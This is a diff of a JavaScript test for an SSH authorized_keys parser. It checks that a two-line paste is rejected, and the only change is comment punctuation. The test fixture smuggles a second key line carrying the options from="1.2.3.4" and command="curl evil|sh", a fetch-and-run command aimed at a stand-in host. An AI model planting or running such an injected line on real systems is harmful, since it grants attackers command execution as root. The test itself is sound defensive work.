@@ -77,8 +77,8 @@ describe('reading keys', () => {
   });
 
   test('a two-line paste is refused whole, not accepted as its first line', () => {
-    // A newline buried in a paste would let a second authorized_keys line — with its own
-    // `command=`/`from=` options — ride into root's file behind a valid first key. One
+    // A newline buried in a paste would let a second authorized_keys line, with its own
+    // `command=`/`from=` options, ride into root's file behind a valid first key. One
     // key means one line.
     const smuggled = `${ED25519}\nfrom="1.2.3.4",command="curl evil|sh" ${ED25519}`;
     expect(parseKeyLine(smuggled)).toBeNull();
